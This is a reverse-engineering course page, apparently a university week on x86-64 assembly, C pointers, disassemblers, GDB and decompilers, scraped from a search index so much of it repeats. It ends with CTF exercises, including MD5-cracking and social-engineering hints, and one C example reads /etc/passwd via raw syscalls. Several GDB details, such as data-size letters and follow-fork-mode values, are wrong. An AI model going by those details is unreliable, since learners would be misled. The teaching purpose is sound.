0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: -> 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400a -> 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400d 0x080400a: add, rax, rbx RAX = 0xdeadd123 -> 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804010 0x080400a: add, rax, rbx RAX = 0xdeadd123 0x080400d: inc rbx RBX = 0x1235 -> 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804013 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0x0 -> 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0xdeadbeee 0x0804013: mov rcx, rax RDX = 0x0 Control Flow How can we express conditionals in x86-64? We use conditional jumps such as: jnz <address> je <address> jge <address> jle <address> etc. They jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as add rax, rbx which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a jo instruction. The most important thing to remember is the cmp instruction: cmp rax, rbx jle error This assembly jumps if RAX <= RBX Addresses Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier: mov rax, [0xdeadbeef] The square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax: rax = *0xdeadbeef; The C Programming Language History The C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created. C is the letter and the programming language after B! C was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust. Hello World C is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar. #include <stdio.h> int main() { printf(\"Hello, World!\"); return 0; } Today Today C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in. While it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use. Some common compilers include: gcc clang A good way to explore this relationship is to use this online GCC Explorer from Matt Godbolt. In regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues. Other higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety. There are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities: gets - Can result in buffer overflows strcpy - Can result in buffer overflows strcat - Can result in buffer overflows strcmp - Can result in timing attacks Types C has four basic types: char - characters int - integers (e.g. 125) float - 32 bit floating point number (e.g. 2.4) double - 64 bit floating point number (like a float but more precise in terms of decimal points) Pointers C uses an idea known as pointers. A pointer is a variable which contains the address of another variable. To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses. Take the following example of defining an integer in C: int x = 4; To the programmer this is the variable x receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address 0x1000 now holds the value 4 . The computer knows to directly access the memory and retrieve the value 4 whenever the programmer tries to use the x variable. If we were to say x + 4 , the computer would give you 8 instead of 0x1004 . But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the & character and using * to create an \"integer pointer\" type. int* y = &x; The y variable will store the address pointed to by the x variable (0x1000). The * character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering *y allows us to access the 4 value instead of 0x1000. Whenever we use the y variable we are using the memory address, but if we use the x variable we use the value stored at the memory address. Arrays Arrays are a grouping of objects of the same type. They are typically created with the following syntax: type arrayName [ arraySize ]; To initialize values in the array we can do: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; Arrays allow programmers to group data into logical containers. To access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; /* indexes 0 1 2 3 4 5 6 7 8 9 To access the value 6 we would use index 5: integers[5]; How do arrays work? Arrays are a clever combination of multiplication, pointers, and programming. Because the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array. For example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math: 1000 + (4 * 8) = 1032 array [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] index 0 1 2 3 4 5 6 7 addrs 1000 1008 1016 1024 1032 1040 1048 1056 Disassemblers A disassembler is a tool which breaks down a compiled program into machine code. List of Disassemblers IDA Binary Ninja GNU Debugger (GDB) radare2 Hopper IDA The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format. IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier: https://github.com/google/binnavi https://github.com/yegord/snowman https://github.com/gaasedelen/lighthouse https://github.com/joxeankoret/diaphora https://github.com/REhints/HexRaysCodeXplorer https://github.com/osirislab/Fentanyl Binary Ninja Binary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers. Binja also has some community contributed plugins which are collected here: https://github.com/Vector35/community-plugins gdb The GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities. gdb is often used in tandom with enhancement scripts like peda , pwndbg , and GEF The GNU Debugger (GDB) The GNU Debugger or GDB is a powerful debugger which allows for step-by-step execution of a program. It can be used to trace program execution and is an important part of any reverse engineering toolkit. Vanilla GDB GDB without any modifications is unintuitive and obscures a lot of useful information. The plug-in pwndb solves a lot of these problems and makes for a much more pleasant experience. But if you are constrained and have to use vanilla gdb, here are several things to make your life easier. Starting GDB To execute GBD and attach it to a program simply run gdb [program] Disassembly (gdb) disassemble [address/symbol] will display the disassembly for that function/frame GDB will autocomplete functions, so saying (gdb) disas main suffices if you'd like to see the disassembly of main View Disassembly During Execution Another handy thing to see while stepping through a program is the disassembly of nearby instructions: (gdb) display/[# of instructions]i $pc [\u00b1 offset] display shows data with each step /[#]i shows how much data in the format i for instruction $pc means the pc, program counter, register [\u00b1 offset] allows you to specify how you would like the data offset from the current instruction Example Usage (gdb) display/10i $pc - 0x5 This command will show 10 instructions on screen with an offset from the next instruction of 5, giving us this display: 0x8048535 <main+6>: lock pushl -0x4(%ecx) 0x8048539 <main+10>: push %ebp => 0x804853a <main+11>: mov %esp,%ebp 0x804853c <main+13>: push %ecx 0x804853d <main+14>: sub $0x14,%esp 0x8048540 <main+17>: sub $0xc,%esp 0x8048543 <main+20>: push $0x400 0x8048548 <main+25>: call 0x80483a0 <malloc@plt> 0x804854d <main+30>: add $0x10,%esp 0x8048550 <main+33>: sub $0xc,%esp Deleting Views If for whatever reason, a view no long suits your needs simply call (gdb) info display which will give you a list of active displays: Auto-display expressions now in effect: Num Enb Expression 1: y /10bi $pc-0x5 Then simply execute (gdb) delete display 1 and your execution will resume without the display. Registers In order to view the state of registers with vanilla gdb, you need to run the command info registers which will display the state of all the registers: eax 0xf77a6ddc -142971428 ecx 0xffe06b10 -2069744 edx 0xffe06b34 -2069708 ebx 0x0 0 esp 0xffe06af8 0xffe06af8 ebp 0x0 0x0 esi 0xf77a5000 -142979072 edi 0xf77a5000 -142979072 eip 0x804853a 0x804853a <main+11> eflags 0x286 [ PF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 If you simply would like to see the contents of a single register, the notation x/x $[register] where: x/x means display the address in hex notation $[register] is the register code such as eax, rax, etc. Pwndbg These commands work with vanilla gdb as well. Setting Breakpoints Setting breakpoints in GDB uses the format b*[Address/Symbol] Example Usage (gdb) b*main : Break at the start (gdb) b*0x804854d : Break at 0x804854d (gdb) b*0x804854d-0x100 : Break at 0x804844d Deleting Breakpoints As before, in order to delete a view, you can list the available breakpoints using (gdb) info breakpoints (don't forget about GDB's autocomplete, you don't always need to type out every command!) which will display all breakpoints: Num Type Disp Enb Address What 1 breakpoint keep y 0x0804852f <main> 3 breakpoint keep y 0x0804864d <__libc_csu_init+61> Then simply execute (gdb) delete 1 Note GDB creates breakpoints chronologically and does NOT reuse numbers. Stepping What good is a debugger if you can't control where you are going? In order to begin execution of a program, use the command r [arguments] similar to how if you ran it with dot-slash notation you would execute it ./program [arguments] . In this case the program will run normally and if no breakpoints are set, you will execute normally. If you have breakpoints set, you will stop at that instruction. (gdb) continue [# of breakpoints] : Resumes the execution of the program until it finishes or until another breakpoint is hit (shorthand c ) (gdb) step[# of instructions] : Steps into an instruction the specified number of times, default is 1 (shorthand s ) (gdb) next instruction [# of instructions] : Steps over an instruction meaning it will not delve into called functions (shorthand ni ) (gdb) finish : Finishes a function and breaks after it gets returned (shorthand fin ) Examining Examining data in GDB is also very useful for seeing how the program is affecting data. The notation may seem complex at first, but it is flexible and provides powerful functionality. (gdb) x/[#][size][format] [Address/Symbol/Register][\u00b1 offset] x/ means examine [#] means how much [size] means what size the data should be such as a word w (2 bytes), double word d (4 bytes), or giant word g (8 bytes) [format] means how the data should be interpreted such as an instruction i , a string s , hex bytes x [Address/Symbol][\u00b1 offset] means where to start interpreting the data Example Usage (gdb) x/x $rax : Displays the content of the register RAX as hex bytes (gdb) x/i 0xdeadbeef : Displays the instruction at address 0xdeadbeef (gdb) x/10s 0x893e10 : Displays 10 strings at the address (gdb) x/10gx 0x7fe10 : Displays 10 giant words as hex at the address Forking If the program happens to be an accept-and-fork server, gdb will have issues following the child or parent processes. In order to specify how you want gdb to function you can use the command set follow-fork-mode [on/off] Setting Data If you would like to set data at any point, it is possible using the command set [Address/Register]=[Hex Data] Example Usage set $rax=0x0 : Sets the register rax to 0 set 0x1e4a70=0x123 : Sets the data at 0x1e4a70 to 0x123 Process Mapping A handy way to find the process's mapped address spaces is to use info proc map : Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /directory/program 0x8049000 0x804a000 0x1000 0x0 /directory/program 0x804a000 0x804b000 0x1000 0x1000 /directory/program 0xf75cb000 0xf75cc000 0x1000 0x0 0xf75cc000 0xf7779000 0x1ad000 0x0 /lib32/libc-2.23.so 0xf7779000 0xf777b000 0x2000 0x1ac000 /lib32/libc-2.23.so 0xf777b000 0xf777c000 0x1000 0x1ae000 /lib32/libc-2.23.so 0xf777c000 0xf7780000 0x4000 0x0 0xf778b000 0xf778d000 0x2000 0x0 [vvar] 0xf778d000 0xf778f000 0x2000 0x0 [vdso] 0xf778f000 0xf77b1000 0x22000 0x0 /lib32/ld-2.23.so 0xf77b1000 0xf77b2000 0x1000 0x0 0xf77b2000 0xf77b3000 0x1000 0x22000 /lib32/ld-2.23.so 0xf77b3000 0xf77b4000 0x1000 0x23000 /lib32/ld-2.23.so 0xffc59000 0xffc7a000 0x21000 0x0 [stack] This will show you where the stack, heap (if there is one), and libc are located. Attaching Processes Another useful feature of GDB is to attach to processes which are already running. Simply launch gdb using gdb , then find the process id of the program you would like to attach to an execute attach [pid] . Decompilers Decompilers do the impossible and reverse compiled code back into psuedocode/code. IDA offers HexRays, which translates machine code into a higher language pseudocode. Example Workflow Let's say we are disassembling a program which has the source code: #include <stdio.h> void printSpacer(int num){ for(int i = 0; i < num; ++i){ printf(\"-\"); } printf(\"\\n\"); } int main() { char* string = \"Hello, World!\"; for(int i = 0; i < 13; ++i){ printf(\"%c\", string[i]); for(int j = i+1; j < 13; j++){ printf(\"%c\", string[j]); } printf(\"\\n\"); printSpacer(13 - i); } return 0; } And creates an output of: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! - If we are given a binary compiled from that source and we want to figure out how the source looks, we can use a decompiler to get c pseudocode which we can then use to reconstruct the function. The sample decompilation can look like: printSpacer: int __fastcall printSpacer(int a1) { int i; // [rsp+8h] [rbp-8h] for ( i = 0; i < a1; ++i ) printf(\"-\"); return printf(\"\\n\"); } main: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+18h] [rbp-18h] signed int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; i < 13; ++i ) { v4 = i + 1; printf(\"%c\", (unsigned int)aHelloWorld[i], envp); while ( v4 < 13 ) printf(\"%c\", (unsigned int)aHelloWorld[v4++]); printf(\"\\n\"); printSpacer(13 - i); } return 0; } A good method of getting a good representation of the source is to convert the decompilation into Python since Python is basically psuedocode that runs. Starting with main often allows you to gain a good overview of what the program is doing and will help you translate the other functions. Main We know we will start with a main function and some variables, if you trace the execution of the variables, you can oftentimes determine the variable type. Because i is being used as an index, we know its an int, and because v4 used as one later on, it too is an index. We can also see that we have a variable aHelloWorld being printed with \"%c\", we can determine it represents the 'Hello, World!' string. Lets define all these variables in our Python main function: def main(): string = \"Hello, World!\" i = 0 v4 = 0 for i in range(0, 13): v4 = i + 1 print(string[i], end='') while v4 < 13: print(string[v4], end='') v4 += 1 print() printSpacer(13-i) printSpacer Function Now we can see that printSpacer is clearly being fed an int value. Translating it into python shouldn't be too hard. def printSpacer(number): i = 0 for i in range(0, number): print(\"-\", end='') print() Results Running main() gives us: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! - Exercise (4 pt) De-Android Android source code is easy to de-compile. Rather than reading assembly codes from the beginning, why not try some java first? Try to reverse this Android apk file and find flag in it. Flag format: CTFlearn{******} flag.apk Hint1: if you really have difficult to reverse Android, I would recommend you to try jadx. Hint2: md5 is old and not safe. So many methods can help you to crack md5. (4 pt) Touhou Players Win Twice I heard that some SUSTCers are really good at playing Touhou Project (\u6771\u65b9project) Games. As a kind of STG game, Touhou Project is very difficult and not friendly for beginners. Some one sent me this game and challenged me: if you can pass all 6 levels in Lunatic difficulty, you can have the flag. Each time you finish a level in Lunatic difficulty, one part of flag is given to flag.txt under the game directory. I have several ideas for you to break this game: As a real touhou player, you can play this game until you finish all levels. As a reverse engineer, you may observe the assembly codes and find how flag is given after each level. As a game trainer developer, you also can write a cheat for this game. As a social engineer, you can convince CS315's professor and TAs to tell you the flag. Good luck! https://mega.nz/file/KtNkiZga#juXA-LhgguC8De76CTYnHjPaObvlNcyjyEDXjhkSDCs (2 pt) javaisez3 3rd round of your local Java rev! Note: This requires Java 11 and above to run. javaisez3.jar","title":"Week6 RE: De-compiling Program"},{"location":"CS315/Week%206/#week6-re-de-compiling-program","text":"","title":"Week6 RE: De-compiling Program"},{"location":"CS315/Week%206/#reverse-engineering","text":"Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Assembly / Machine Code The C Programming Language Disassemblers Decompilers","title":"Reverse Engineering"},{"location":"CS315/Week%206/#assemblymachine-code","text":"Machine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well Decompilers can sort of, but more on that later).","title":"Assembly/Machine Code"},{"location":"CS315/Week%206/#from-source-to-compilation","text":"Godbolt shows the differences in machine code generated by various compilers. For example, if we have a simple C++ function: #include <unistd.h> #include <stdio.h> #include <stdlib.h> int main() { char c; int fd = syscall(2, \"/etc/passwd\", 0); while (syscall(0, fd, &c, 1)) { putchar(c); } } We can see the compilation results in some verbose instrucitons for the CPU: .LC0: .string \"/etc/passwd\" main: push rbp mov rbp, rsp sub rsp, 16 mov edx, 0 mov esi, OFFSET FLAT:.LC0 mov edi, 2 mov eax, 0 call syscall mov DWORD PTR [rbp-4], eax .L3: lea rdx, [rbp-5] mov eax, DWORD PTR [rbp-4] mov ecx, 1 mov esi, eax mov edi, 0 mov eax, 0 call syscall test rax, rax setne al test al, al je .L2 movzx eax, BYTE PTR [rbp-5] movsx eax, al mov edi, eax call putchar jmp .L3 .L2: mov eax, 0 leave ret This is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice.","title":"From Source to Compilation"},{"location":"CS315/Week%206/#x86-64","text":"x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes.","title":"x86-64"},{"location":"CS315/Week%206/#x86-64-registers","text":"x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution. x86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes. The special registers include: - RIP: the instruction pointer - RSP: the stack pointer - RBP: the base pointer","title":"x86-64 Registers"},{"location":"CS315/Week%206/#instructions","text":"An instruction represents a single operation for the CPU to perform. There are diferent types of instructions including: Data movement: mov rax, [rsp - 0x40] Arithmetic: add rbx, rcx Control-flow: jne 0x8000400 Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as repne scasb which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!) It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP. Note Instructions, numbers, strings, everything! Always represented in hex. add rax, rbx mov rax, 0xdeadbeef mov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de \"Hello\" == 48 65 6c 6c 6f == 48 01 d8 == 48 c7 c0 ef be ad de","title":"Instructions"},{"location":"CS315/Week%206/#execution","text":"What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it.","title":"Execution"},{"location":"CS315/Week%206/#examples","text":"mov rax, 0xdeadbeef Here the operation mov is moving the \"immeadiate\" 0xdeadbeef into the register RAX mov rax, [0xdeadbeef + rbx * 4] Here the operation mov is moving the data at the address of [0xdeadbeef + RBX*4] into the register RAX . When brackets are used, you can think of the program as getting the content from that effective address.","title":"Examples"},{"location":"CS315/Week%206/#example-execution","text":"-> 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804000 0x080400a: add, rax, rbx RAX = 0x0 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: -> 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400a -> 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400d 0x080400a: add, rax, rbx RAX = 0xdeadd123 -> 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804010 0x080400a: add, rax, rbx RAX = 0xdeadd123 0x080400d: inc rbx RBX = 0x1235 -> 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804013 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0x0 -> 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0xdeadbeee 0x0804013: mov rcx, rax RDX = 0x0","title":"Example Execution"},{"location":"CS315/Week%206/#control-flow","text":"How can we express conditionals in x86-64? We use conditional jumps such as: jnz <address> je <address> jge <address> jle <address> etc. They jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as add rax, rbx which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a jo instruction. The most important thing to remember is the cmp instruction: cmp rax, rbx jle error This assembly jumps if RAX <= RBX","title":"Control Flow"},{"location":"CS315/Week%206/#addresses","text":"Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier: mov rax, [0xdeadbeef] The square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax: rax = *0xdeadbeef;","title":"Addresses"},{"location":"CS315/Week%206/#the-c-programming-language","text":"","title":"The C Programming Language"},{"location":"CS315/Week%206/#history","text":"The C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created. C is the letter and the programming language after B! C was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust.","title":"History"},{"location":"CS315/Week%206/#hello-world","text":"C is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar. #include <stdio.h> int main() { printf(\"Hello, World!\"); return 0; }","title":"Hello World"},{"location":"CS315/Week%206/#today","text":"Today C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in. While it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use. Some common compilers include: gcc clang A good way to explore this relationship is to use this online GCC Explorer from Matt Godbolt. In regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues. Other higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety. There are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities: gets - Can result in buffer overflows strcpy - Can result in buffer overflows strcat - Can result in buffer overflows strcmp - Can result in timing attacks","title":"Today"},{"location":"CS315/Week%206/#types","text":"C has four basic types: char - characters int - integers (e.g. 125) float - 32 bit floating point number (e.g. 2.4) double - 64 bit floating point number (like a float but more precise in terms of decimal points)","title":"Types"},{"location":"CS315/Week%206/#pointers","text":"C uses an idea known as pointers. A pointer is a variable which contains the address of another variable. To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses. Take the following example of defining an integer in C: int x = 4; To the programmer this is the variable x receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address 0x1000 now holds the value 4 . The computer knows to directly access the memory and retrieve the value 4 whenever the programmer tries to use the x variable. If we were to say x + 4 , the computer would give you 8 instead of 0x1004 . But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the & character and using * to create an \"integer pointer\" type. int* y = &x; The y variable will store the address pointed to by the x variable (0x1000). The * character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering *y allows us to access the 4 value instead of 0x1000. Whenever we use the y variable we are using the memory address, but if we use the x variable we use the value stored at the memory address.","title":"Pointers"},{"location":"CS315/Week%206/#arrays","text":"Arrays are a grouping of objects of the same type. They are typically created with the following syntax: type arrayName [ arraySize ]; To initialize values in the array we can do: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; Arrays allow programmers to group data into logical containers. To access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; /* indexes 0 1 2 3 4 5 6 7 8 9 To access the value 6 we would use index 5: integers[5];","title":"Arrays"},{"location":"CS315/Week%206/#how-do-arrays-work","text":"Arrays are a clever combination of multiplication, pointers, and programming. Because the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array. For example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math: 1000 + (4 * 8) = 1032 array [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] index 0 1 2 3 4 5 6 7 addrs 1000 1008 1016 1024 1032 1040 1048 1056","title":"How do arrays work?"},{"location":"CS315/Week%206/#disassemblers","text":"A disassembler is a tool which breaks down a compiled program into machine code.","title":"Disassemblers"},{"location":"CS315/Week%206/#list-of-disassemblers","text":"IDA Binary Ninja GNU Debugger (GDB) radare2 Hopper","title":"List of Disassemblers"},{"location":"CS315/Week%206/#ida","text":"The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format. IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier: https://github.com/google/binnavi https://github.com/yegord/snowman https://github.com/gaasedelen/lighthouse https://github.com/joxeankoret/diaphora https://github.com/REhints/HexRaysCodeXplorer https://github.com/osirislab/Fentanyl","title":"IDA"},{"location":"CS315/Week%206/#binary-ninja","text":"Binary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers. Binja also has some community contributed plugins which are collected here: https://github.com/Vector35/community-plugins","title":"Binary Ninja"},{"location":"CS315/Week%206/#gdb","text":"The GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities. gdb is often used in tandom with enhancement scripts like peda , pwndbg , and GEF","title":"gdb"},{"location":"CS315/Week%206/#the-gnu-debugger-gdb","text":"The GNU Debugger or GDB is a powerful debugger which allows for step-by-step execution of a program. It can be used to trace program execution and is an important part of any reverse engineering toolkit.","title":"The GNU Debugger (GDB)"},{"location":"CS315/Week%206/#vanilla-gdb","text":"GDB without any modifications is unintuitive and obscures a lot of useful information. The plug-in pwndb solves a lot of these problems and makes for a much more pleasant experience. But if you are constrained and have to use vanilla gdb, here are several things to make your life easier.","title":"Vanilla GDB"},{"location":"CS315/Week%206/#starting-gdb","text":"To execute GBD and attach it to a program simply run gdb [program]","title":"Starting GDB"},{"location":"CS315/Week%206/#disassembly","text":"(gdb) disassemble [address/symbol] will display the disassembly for that function/frame GDB will autocomplete functions, so saying (gdb) disas main suffices if you'd like to see the disassembly of main","title":"Disassembly"},{"location":"CS315/Week%206/#view-disassembly-during-execution","text":"Another handy thing to see while stepping through a program is the disassembly of nearby instructions: (gdb) display/[# of instructions]i $pc [\u00b1 offset] display shows data with each step /[#]i shows how much data in the format i for instruction $pc means the pc, program counter, register [\u00b1 offset] allows you to specify how you would like the data offset from the current instruction","title":"View Disassembly During Execution"},{"location":"CS315/Week%206/#example-usage","text":"(gdb) display/10i $pc - 0x5 This command will show 10 instructions on screen with an offset from the next instruction of 5, giving us this display: 0x8048535 <main+6>: lock pushl -0x4(%ecx) 0x8048539 <main+10>: push %ebp => 0x804853a <main+11>: mov %esp,%ebp 0x804853c <main+13>: push %ecx 0x804853d <main+14>: sub $0x14,%esp 0x8048540 <main+17>: sub $0xc,%esp 0x8048543 <main+20>: push $0x400 